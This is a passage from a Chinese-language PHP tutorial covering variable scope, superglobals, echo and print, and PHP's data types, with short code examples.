<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$x=<span class="number">5</span>;</span><br><span class="line">$y=<span class="number">10</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myTest</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $x,$y,$a;</span><br><span class="line">    $y=$x+$y;</span><br><span class="line">    $a=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">myTest();</span><br><span class="line"><span class="keyword">echo</span> $y; <span class="comment">// 输出 15</span></span><br><span class="line"><span class="keyword">echo</span> $a; <span class="comment">// 输出 1</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>PHP 将所有全局变量存储在一个名为 $GLOBALS[<em>index</em>] 的数组中。 <em>index</em> 保存变量的名称。这个数组可以在函数内部访问，也可以直接用来更新全局变量。</p>
<p>上面的实例可以写成这样：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$x=<span class="number">5</span>;</span><br><span class="line">$y=<span class="number">10</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myTest</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $GLOBALS[<span class="string">'y'</span>]=$GLOBALS[<span class="string">'x'</span>]+$GLOBALS[<span class="string">'y'</span>];</span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">myTest();</span><br><span class="line"><span class="keyword">echo</span> $y;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>PHP的执行是以一个.php脚本为单位，在一个.php脚本的执行过程中，可以include和require其他PHP脚本进来执行。执行的.php脚本与include/require进来的脚本共享一个全局域(global scope)。global关键字无论在哪层，所引用的都是全局域的变量。</p>
<h4 id="Static"><a href="#Static" class="headerlink" title="Static"></a>Static</h4><p>每次调用该函数时，该变量将会保留着函数前一次被调用时的值。该变量仍然是函数的局部变量，但不会像普通的局部变量一样因为函数完成而被删除。</p>
<h4 id="Parameter"><a href="#Parameter" class="headerlink" title="Parameter"></a>Parameter</h4><p>参数是通过调用代码将值传递给函数的局部变量。参数是在参数列表中声明的，作为函数声明的一部分。实例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myTest</span><span class="params">($x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $x;</span><br><span class="line">&#125;</span><br><span class="line">myTest(<span class="number">5</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="预定义变量"><a href="#预定义变量" class="headerlink" title="预定义变量"></a>预定义变量</h3><p>PHP 提供了大量的预定义变量。由于许多变量依赖于运行的服务器的版本和设置，及其它因素，所以并没有详细的说明文档。一些预定义变量在 PHP 以<a href="https://www.php.net/manual/zh/features.commandline.php" target="_blank" rel="noopener">命令行</a>形式运行时并不生效。有关这些变量的详细列表，请参阅<a href="https://www.php.net/manual/zh/reserved.variables.php" target="_blank" rel="noopener">预定义变量</a>一章。</p>
<p>如果有可用的 PHP 预定义变量那最好用，如<a href="https://www.php.net/manual/zh/language.variables.superglobals.php" target="_blank" rel="noopener">超全局数组</a>。</p>
<p>超级全局变量不能被用作函数或类方法中的<a href="https://www.php.net/manual/zh/language.variables.variable.php" target="_blank" rel="noopener">可变变量</a>。</p>
<ul>
<li><a href="https://www.php.net/manual/zh/language.variables.superglobals.php" target="_blank" rel="noopener">超全局变量</a> — 超全局变量是在全部作用域中始终可用的内置变量</li>
<li><a href="https://www.php.net/manual/zh/reserved.variables.globals.php" target="_blank" rel="noopener">$GLOBALS</a> — 引用全局作用域中可用的全部变量</li>
<li><a href="https://www.php.net/manual/zh/reserved.variables.server.php" target="_blank" rel="noopener">$_SERVER</a> — 服务器和执行环境信息</li>
<li><a href="https://www.php.net/manual/zh/reserved.variables.get.php" target="_blank" rel="noopener">$_GET</a> — HTTP GET 变量</li>
<li><a href="https://www.php.net/manual/zh/reserved.variables.post.php" target="_blank" rel="noopener">$_POST</a> — HTTP POST 变量</li>
<li><a href="https://www.php.net/manual/zh/reserved.variables.files.php" target="_blank" rel="noopener">$_FILES</a> — HTTP 文件上传变量</li>
<li><a href="https://www.php.net/manual/zh/reserved.variables.request.php" target="_blank" rel="noopener">$_REQUEST</a> — HTTP Request 变量</li>
<li><a href="https://www.php.net/manual/zh/reserved.variables.session.php" target="_blank" rel="noopener">$_SESSION</a> — Session 变量</li>
<li><a href="https://www.php.net/manual/zh/reserved.variables.environment.php" target="_blank" rel="noopener">$_ENV</a> — 环境变量</li>
<li><a href="https://www.php.net/manual/zh/reserved.variables.cookies.php" target="_blank" rel="noopener">$_COOKIE</a> — HTTP Cookies</li>
<li><a href="https://www.php.net/manual/zh/reserved.variables.phperrormsg.php" target="_blank" rel="noopener">$php_errormsg</a> — 前一个错误信息</li>
<li><a href="https://www.php.net/manual/zh/reserved.variables.httprawpostdata.php" target="_blank" rel="noopener">$HTTP_RAW_POST_DATA</a> — 原生POST数据</li>
<li><a href="https://www.php.net/manual/zh/reserved.variables.httpresponseheader.php" target="_blank" rel="noopener">$http_response_header</a> — HTTP 响应头</li>
<li><a href="https://www.php.net/manual/zh/reserved.variables.argc.php" target="_blank" rel="noopener">$argc</a> — 传递给脚本的参数数目</li>
<li><a href="https://www.php.net/manual/zh/reserved.variables.argv.php" target="_blank" rel="noopener">$argv</a> — 传递给脚本的参数数组</li>
</ul>
<h3 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h3><p>在 PHP 的函数和类的方法中，<a href="https://www.php.net/manual/zh/language.variables.superglobals.php" target="_blank" rel="noopener">超全局变量</a>不能用作可变变量。*$this* 变量也是一个特殊变量，不能被动态引用。</p>
<p>要将可变变量用于数组，必须解决一个模棱两可的问题。这就是当写下 $$a[1] 时，解析器需要知道是想要 $a[1] 作为一个变量呢，还是想要 $$a 作为一个变量并取出该变量中索引为 [1] 的值。解决此问题的语法是，对第一种情况用 ${$a[1]}，对第二种情况用 ${$a}[1]。</p>
<h3 id="PHP之外的变量"><a href="#PHP之外的变量" class="headerlink" title="PHP之外的变量"></a>PHP之外的变量</h3><p>通常，PHP 不会改变传递给脚本中的变量名。然而应该注意到点（句号）不是 PHP 变量名中的合法字符。至于原因，看看：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$varname.ext;  <span class="comment">/* 非法变量名 */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这时，解析器看到是一个名为 $varname 的变量，后面跟着一个字符串连接运算符，后面跟着一个裸字符串（即没有加引号的字符串，且不匹配任何已知的健名或保留字）’ext’。很明显这不是想要的结果。</p>
<p>出于此原因，要注意 PHP 将会自动将外部变量名中的点替换成下划线。</p>
<p>因为 PHP 会判断变量类型并在需要时进行转换（通常情况下），因此在某一时刻给定的变量是何种类型并不明显。PHP 包括几个函数可以判断变量的类型，例如：<a href="https://www.php.net/manual/zh/function.gettype.php" target="_blank" rel="noopener">gettype()</a>，<a href="https://www.php.net/manual/zh/function.is-array.php" target="_blank" rel="noopener">is_array()</a>，<a href="https://www.php.net/manual/zh/function.is-float.php" target="_blank" rel="noopener">is_float()</a>，<a href="https://www.php.net/manual/zh/function.is-int.php" target="_blank" rel="noopener">is_int()</a>，<a href="https://www.php.net/manual/zh/function.is-object.php" target="_blank" rel="noopener">is_object()</a> 和 <a href="https://www.php.net/manual/zh/function.is-string.php" target="_blank" rel="noopener">is_string()</a>。参见<a href="https://www.php.net/manual/zh/language.types.php" target="_blank" rel="noopener">类型</a>一章。</p>
<h2 id="输出语句"><a href="#输出语句" class="headerlink" title="输出语句"></a>输出语句</h2><h3 id="echo和print"><a href="#echo和print" class="headerlink" title="echo和print"></a>echo和print</h3><ul>
<li>echo - 可以输出一个或多个字符串</li>
<li>print - 只允许输出一个字符串，返回值总为 1</li>
</ul>
<p><strong>提示：</strong>echo 输出的速度比 print 快， echo 没有返回值，print有返回值1。</p>
<h3 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h3><p>使用的时候可以不用加括号，也可以加上括号： echo 或 echo()。输出的字符串可以带有html标签，多个串用逗号隔开。</p>
<p>实例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$txt1=<span class="string">"学习 PHP"</span>;</span><br><span class="line">$txt2=<span class="string">"RUNOOB.COM"</span>;</span><br><span class="line">$cars=<span class="keyword">array</span>(<span class="string">"Volvo"</span>,<span class="string">"BMW"</span>,<span class="string">"Toyota"</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> $txt1;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"在 $txt2 学习 PHP "</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"我车的品牌是 &#123;$cars[0]&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="print"><a href="#print" class="headerlink" title="print"></a>print</h3><p>可以使用括号，也可以不使用括号： print 或 print()。使用与echo基本相同。</p>
<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><h3 id="String"><a href="#String" class="headerlink" title="String"></a>String</h3><p>放在单引号双引号中均可。</p>
<p>单引号除了单引号本身和反斜线以外其它均不转义。</p>
<p>当字符串用双引号或 heredoc 结构定义时，其中的<a href="https://www.php.net/manual/zh/language.variables.php" target="_blank" rel="noopener">变量</a>将会被解析。</p>
<p>PHP 的字符串在内部是字节组成的数组。因此用花括号访问或修改字符串对多字节字符集很不安全。</p>
<h4 id="heredoc"><a href="#heredoc" class="headerlink" title="heredoc"></a>heredoc</h4><p><em>&lt;&lt;&lt;xxx</em>。</p>
<p>要注意的是结束标识符这行除了<em>可能</em>有一个分号（*;<em>）外，绝对不能包含其它字符。这意味着标识符</em>不能缩进*，分号的前后也不能有任何空白或制表符。更重要的是结束标识符的前面必须是个被本地操作系统认可的换行，比如在 UNIX 和 Mac OS X 系统中是 <em>\n</em>，而结束定界符（可能其后有个分号）之后也必须紧跟一个换行。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $bar = <span class="string">&lt;&lt;&lt;EOT</span></span><br><span class="line"><span class="string">bar</span></span><br><span class="line">    EOT;  <span class="comment">//非法！！！</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="nowdoc"><a href="#nowdoc" class="headerlink" title="nowdoc"></a>nowdoc</h4><p>*&lt;&lt;&lt;’xxx’*。</p>
<p>与heredoc结构相似，但不对特殊字符转义。（&gt;php5.3.0）</p>
<h4 id="变量解析"><a href="#变量解析" class="headerlink" title="变量解析"></a>变量解析</h4><ul>
<li><p>简单语法</p>
<p>遇 <code>$</code> 尝试解析。</p>
</li>
<li><p>复杂语法</p>
<p>花括号括起。里面可以写复杂的表达式。只有 <em>$</em> 紧挨着 <em>{</em> 时才会被识别。</p>
</li>
</ul>
<h4 id="存取和修改字符"><a href="#存取和修改字符" class="headerlink" title="存取和修改字符"></a>存取和修改字符</h4><p>用方括号或花括号访问。</p>
<h3 id="Int"><a href="#Int" class="headerlink" title="Int"></a>Int</h3><p>不能包含逗号和空格，无小数点，可正可负，可以是十进制， 十六进制（ 以 0x 为前缀）或八进制（前缀为 0）。</p>
<h3 id="Float"><a href="#Float" class="headerlink" title="Float"></a>Float</h3><p>带小数的或是指数形式的。例如： 1.2，2.4e3，8E-5。</p>
<h3 id="Bool"><a href="#Bool" class="headerlink" title="Bool"></a>Bool</h3><p>true或false。</p>
<h3 id="Array"><a href="#Array" class="headerlink" title="Array"></a>Array</h3><p>有序映射。映射是一种把 <em>values</em> 关联到 <em>keys</em> 的类型。由于数组元素的值也可以是另一个数组，树形结构和多维数组也是允许的。</p>
<h4 id="定义数组"><a href="#定义数组" class="headerlink" title="定义数组"></a>定义数组</h4><p>可以用 <a href="https://www.php.net/manual/zh/function.array.php" target="_blank" rel="noopener">array()</a> 语言结构来新建一个数组。它接受任意数量用逗号分隔的 <em>键（key） =&gt; 值（value）</em>对。</p>
<p>自 5.4 起可以使用短数组定义语法，用 <em>[]</em> 替代 *array()*。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$array = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"foo"</span> =&gt; <span class="string">"bar"</span>,</span><br><span class="line">    <span class="string">"bar"</span> =&gt; <span class="string">"foo"</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自 PHP 5.4 起</span></span><br><span class="line">$array = [</span><br><span class="line">    <span class="string">"foo"</span> =&gt; <span class="string">"bar"</span>,</span><br><span class="line">    <span class="string">"bar"</span> =&gt; <span class="string">"foo"</span>,</span><br><span class="line">];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>key 可以是 <a href="https://www.php.net/manual/zh/language.types.integer.php" target="_blank" rel="noopener">integer</a> 或者 <a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a>。value 可以是任意类型。</p>
<ul>
<li>包含有合法整型值的字符串会被转换为整型。例如键名 <em>“8”</em> 实际会被储存为 <em>8</em>。但是 <em>“08”</em> 则不会强制转换，因为其不是一个合法的十进制数值。</li>
<li>浮点数也会被转换为整型，意味着其小数部分会被舍去。例如键名 <em>8.7</em> 实际会被储存为 <em>8</em>。</li>
<li>布尔值也会被转换成整型。即键名 <em>true</em> 实际会被储存为 <em>1</em> 而键名 <em>false</em> 会被储存为 <em>0</em>。</li>
<li><a href="https://www.php.net/manual/zh/language.types.null.php" target="_blank" rel="noopener">Null</a> 会被转换为空字符串，即键名 <em>null</em> 实际会被储存为 *””*。</li>
<li>数组和对象<em>不能</em>被用为键名。坚持这么做会导致警告：<em>Illegal offset type</em>。</li>
</ul>
<p><strong>如果在数组定义中多个单元都使用了同一个键名，则只使用了最后一个，之前的都被覆盖了。</strong></p>
<p>PHP 数组可以同时含有 <a href="https://www.php.net/manual/zh/language.types.integer.php" target="_blank" rel="noopener">integer</a> 和 <a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a> 类型的键名，因为 PHP 实际并不区分索引数组和关联数组。</p>
<p>如果未指定key，PHP 将自动使用之前用过的最大 <a href="https://www.php.net/manual/zh/language.types.integer.php" target="_blank" rel="noopener">integer</a> 键名加上 1 作为新的键名，之前没用过integer键名的取key值为0（注意这里所使用的最大整数键名<em>不一定</em>当前就在数组中。它只要在上次数组重新生成索引后曾经存在过就行了。）：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$array = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"foo"</span> =&gt; <span class="string">"bar"</span>,</span><br><span class="line">    <span class="string">"bar"</span> =&gt; <span class="string">"foo"</span>,</span><br><span class="line">    <span class="number">100</span>   =&gt; <span class="number">-100</span>,</span><br><span class="line">    <span class="number">-100</span>  =&gt; <span class="number">100</span>,</span><br><span class="line">);</span><br><span class="line">$array[] = <span class="string">"a"</span>;</span><br><span class="line">var_dump($array);</span><br><span class="line">    </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">array(5) &#123;</span></span><br><span class="line"><span class="comment">  ["foo"]=&gt;</span></span><br><span class="line"><span class="comment">  string(3) "bar"</span></span><br><span class="line"><span class="comment">  ["bar"]=&gt;</span></span><br><span class="line"><span class="comment">  string(3) "foo"</span></span><br><span class="line"><span class="comment">  [100]=&gt;</span></span><br><span class="line"><span class="comment">  int(-100)</span></span><br><span class="line"><span class="comment">  [-100]=&gt;</span></span><br><span class="line"><span class="comment">  int(100)</span></span><br><span class="line"><span class="comment">  [101]=&gt;</span></span><br><span class="line"><span class="comment">  string(1) "a"</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>还可以只对某些单元指定键名而对其它的空置：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$array = <span class="keyword">array</span>(</span><br><span class="line">         <span class="string">"a"</span>,</span><br><span class="line">         <span class="string">"b"</span>,</span><br><span class="line">    <span class="number">6</span> =&gt; <span class="string">"c"</span>,</span><br><span class="line">         <span class="string">"d"</span>,</span><br><span class="line">);</span><br><span class="line">var_dump($array);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">array(4) &#123;</span></span><br><span class="line"><span class="comment">  [0]=&gt;</span></span><br><span class="line"><span class="comment">  string(1) "a"</span></span><br><span class="line"><span class="comment">  [1]=&gt;</span></span><br><span class="line"><span class="comment">  string(1) "b"</span></span><br><span class="line"><span class="comment">  [6]=&gt;</span></span><br><span class="line"><span class="comment">  string(1) "c"</span></span><br><span class="line"><span class="comment">  [7]=&gt;</span></span><br><span class="line"><span class="comment">  string(1) "d"</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h4 id="访问数组单元"><a href="#访问数组单元" class="headerlink" title="访问数组单元"></a>访问数组单元</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$array = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"foo"</span> =&gt; <span class="string">"bar"</span>,</span><br><span class="line">    <span class="number">42</span>    =&gt; <span class="number">24</span>,</span><br><span class="line">    <span class="string">"multi"</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">         <span class="string">"dimensional"</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">             <span class="string">"array"</span> =&gt; <span class="string">"foo"</span></span><br><span class="line">         )</span><br><span class="line">    )</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">var_dump($array[<span class="string">"foo"</span>]);</span><br><span class="line">var_dump($array[<span class="number">42</span>]);</span><br><span class="line">var_dump($array[<span class="string">"multi"</span>][<span class="string">"dimensional"</span>][<span class="string">"array"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>Note</strong>:</p>
<p>方括号和花括号可以互换使用来访问数组单元（例如 $array[42] 和 $array{42} 在上例中效果相同）。</p>
</blockquote>
<h4 id="新建、修改、删除值"><a href="#新建、修改、删除值" class="headerlink" title="新建、修改、删除值"></a>新建、修改、删除值</h4><p>要修改某个值，通过其键名给该单元赋一个新值。要删除某键值对，对其调用 <a href="https://www.php.net/manual/zh/function.unset.php" target="_blank" rel="noopener">unset()</a> 函数。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="number">5</span> =&gt; <span class="number">1</span>, <span class="number">12</span> =&gt; <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">$arr[] = <span class="number">56</span>;    <span class="comment">// This is the same as $arr[13] = 56;</span></span><br><span class="line">                <span class="comment">// at this point of the script</span></span><br><span class="line"></span><br><span class="line">$arr[<span class="string">"x"</span>] = <span class="number">42</span>; <span class="comment">// This adds a new element to</span></span><br><span class="line">                <span class="comment">// the array with key "x"</span></span><br><span class="line">                </span><br><span class="line"><span class="keyword">unset</span>($arr[<span class="number">5</span>]); <span class="comment">// This removes the element from the array</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unset</span>($arr);    <span class="comment">// This deletes the whole array</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="数组解引用"><a href="#数组解引用" class="headerlink" title="数组解引用"></a>数组解引用</h4><p>自 PHP 5.4 起可以用直接对函数或方法调用的结果进行数组解引用，在此之前只能通过一个临时变量。</p>
<p>自 PHP 5.5 起可以直接对一个数组原型进行数组解引用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getArray</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// on PHP 5.4</span></span><br><span class="line">$secondElement = getArray()[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// previously</span></span><br><span class="line">$tmp = getArray();</span><br><span class="line">$secondElement = $tmp[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// or</span></span><br><span class="line"><span class="keyword">list</span>(, $secondElement) = getArray();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="数组实用函数"><a href="#数组实用函数" class="headerlink" title="数组实用函数"></a>数组实用函数</h4><p><a href="https://www.php.net/manual/zh/function.unset.php" target="_blank" rel="noopener">unset()</a> 函数允许删除数组中的某个键。但要注意数组将<em>不会</em>重建索引。如果需要删除后重建索引，可以用 <a href="https://www.php.net/manual/zh/function.array-values.php" target="_blank" rel="noopener">array_values()</a> 函数。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">array</span>(<span class="number">1</span> =&gt; <span class="string">'one'</span>, <span class="number">2</span> =&gt; <span class="string">'two'</span>, <span class="number">3</span> =&gt; <span class="string">'three'</span>);</span><br><span class="line"><span class="keyword">unset</span>($a[<span class="number">2</span>]);</span><br><span class="line"><span class="comment">/* will produce an array that would have been defined as</span></span><br><span class="line"><span class="comment">   $a = array(1 =&gt; 'one', 3 =&gt; 'three');</span></span><br><span class="line"><span class="comment">   and NOT</span></span><br><span class="line"><span class="comment">   $a = array(1 =&gt; 'one', 2 =&gt;'three');</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">$b = array_values($a);</span><br><span class="line"><span class="comment">// Now $b is array(0 =&gt; 'one', 1 =&gt;'three')</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>此外，foreach函数专门用于数组。（简单遍历）</p>
<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>应该始终在用字符串表示的数组索引上加上引号。而键名为常量和变量的不需要加引号。</p>
<p>可用函数返回值做数组索引。也可用已知常量。</p>
<h4 id="转换为数组"><a href="#转换为数组" class="headerlink" title="转换为数组"></a>转换为数组</h4><p>对于任意 <a href="https://www.php.net/manual/zh/language.types.integer.php" target="_blank" rel="noopener">integer</a>，<a href="https://www.php.net/manual/zh/language.types.float.php" target="_blank" rel="noopener">float</a>，<a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a>，<a href="https://www.php.net/manual/zh/language.types.boolean.php" target="_blank" rel="noopener">boolean</a> 和 <a href="https://www.php.net/manual/zh/language.types.resource.php" target="_blank" rel="noopener">resource</a> 类型，如果将一个值转换为数组，将得到一个仅有一个元素的数组，其下标为 0，该元素即为此标量的值。换句话说，*(array)$scalarValue* 与 <em>array($scalarValue)</em> 完全一样。</p>
<p>如果一个 <a href="https://www.php.net/manual/zh/language.types.object.php" target="_blank" rel="noopener">object</a> 类型转换为 <a href="https://www.php.net/manual/zh/language.types.array.php" target="_blank" rel="noopener">array</a>，则结果为一个数组，其单元为该对象的属性。键名将为成员变量名，不过有几点例外：整数属性不可访问；私有变量前会加上类名作前缀；保护变量前会加上一个 ‘*’ 做前缀。这些前缀的前后都各有一个 NULL 字符。这会导致一些不可预知的行为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $A; <span class="comment">// This will become '\0A\0A'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $A; <span class="comment">// This will become '\0B\0A'</span></span><br><span class="line">    <span class="keyword">public</span> $AA; <span class="comment">// This will become 'AA'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var_dump((<span class="keyword">array</span>) <span class="keyword">new</span> B());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h4><p>array_diff()，数组运算符。</p>
<h3 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h3><h4 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h4><p>new 语句。</p>
<h4 id="转换为对象"><a href="#转换为对象" class="headerlink" title="转换为对象"></a>转换为对象</h4><p>如果其它任何类型的值被转换成对象，将会创建一个内置类 <em>stdClass</em> 的实例。如果该值为 **<code>NULL</code>**，则新的实例为空。 <a href="https://www.php.net/manual/zh/language.types.array.php" target="_blank" rel="noopener">array</a> 转换成 <a href="https://www.php.net/manual/zh/language.types.object.php" target="_blank" rel="noopener">object</a> 将使键名成为属性名并具有相对应的值。注意：在这个例子里， 使用 PHP 7.2.0 之前的版本，数字键只能通过迭代访问。对于其他值，会包含进成员变量名 <em>scalar</em>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$obj = (object) <span class="string">'ciao'</span>;</span><br><span class="line"><span class="keyword">echo</span> $obj-&gt;scalar;  <span class="comment">// outputs 'ciao'</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="Resource"><a href="#Resource" class="headerlink" title="Resource"></a>Resource</h3><p><code>get_resource_type</code> 返回资源类型。例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$c = mysql_connect();</span><br><span class="line"><span class="keyword">echo</span> get_resource_type($c).<span class="string">"\n"</span>;</span><br><span class="line"><span class="comment">// 打印：mysql link</span></span><br><span class="line"></span><br><span class="line">$fp = fopen(<span class="string">"foo"</span>,<span class="string">"w"</span>);</span><br><span class="line"><span class="keyword">echo</span> get_resource_type($fp).<span class="string">"\n"</span>;</span><br><span class="line"><span class="comment">// 打印：file</span></span><br><span class="line"></span><br><span class="line">$doc = new_xmldoc(<span class="string">"1.0"</span>);</span><br><span class="line"><span class="keyword">echo</span> get_resource_type($doc-&gt;doc).<span class="string">"\n"</span>;</span><br><span class="line"><span class="comment">// 打印：domxml document</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="Callback-Callable"><a href="#Callback-Callable" class="headerlink" title="Callback/Callable"></a>Callback/Callable</h3><p>自 PHP 5.4 起可用 <a href="https://www.php.net/manual/zh/language.types.callable.php" target="_blank" rel="noopener">callable</a> 类型指定回调类型 callback。</p>
<h3 id="NULL"><a href="#NULL" class="headerlink" title="NULL"></a>NULL</h3><p>NULL 值表示变量没有值。NULL 是数据类型为 NULL 的值。</p>
<h3 id="伪类型与变量"><a href="#伪类型与变量" class="headerlink" title="伪类型与变量"></a>伪类型与变量</h3><h4 id="mixed"><a href="#mixed" class="headerlink" title="mixed"></a>mixed</h4><p>一个参数可以接受多种不同的（但不一定是所有的）类型。</p>
<h4 id="number"><a href="#number" class="headerlink" title="number"></a>number</h4><p>可以是 <a href="https://www.php.net/manual/zh/language.types.integer.php" target="_blank" rel="noopener">integer</a> 或者 <a href="https://www.php.net/manual/zh/language.types.float.php" target="_blank" rel="noopener">float</a>。</p>
<h4 id="callback"><a href="#callback" class="headerlink" title="callback"></a>callback</h4><p>在 PHP 5.4 引入 <a href="https://www.php.net/manual/zh/language.types.callable.php" target="_blank" rel="noopener">callable</a> 类型之前使用 了 <a href="https://www.php.net/manual/zh/language.pseudo-types.php#language.types.callback" target="_blank" rel="noopener">callback</a> 伪类型。二者含义完全相同。</p>
<h4 id="array-object"><a href="#array-object" class="headerlink" title="array|object"></a>array|object</h4><p>既可以是 <a href="https://www.php.net/manual/zh/language.types.array.php" target="_blank" rel="noopener">array</a> 也可以是 <a href="https://www.php.net/manual/zh/language.types.object.php" target="_blank" rel="noopener">object</a>。</p>
<h4 id="void"><a href="#void" class="headerlink" title="void"></a>void</h4><p><em>void</em> 作为返回类型意味着函数的返回值是无用的。<em>void</em> 作为参数列表意味着函数不接受任何参数。</p>
<h4 id="…"><a href="#…" class="headerlink" title="…"></a>…</h4><p>在函数原型中，<code>$...</code> 表示<em>等等</em>的意思。当一个函数可以接受任意个参数时使用此变量名。</p>
<h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><h4 id="类型设置"><a href="#类型设置" class="headerlink" title="类型设置"></a>类型设置</h4><p>settype设置变量类型。</p>
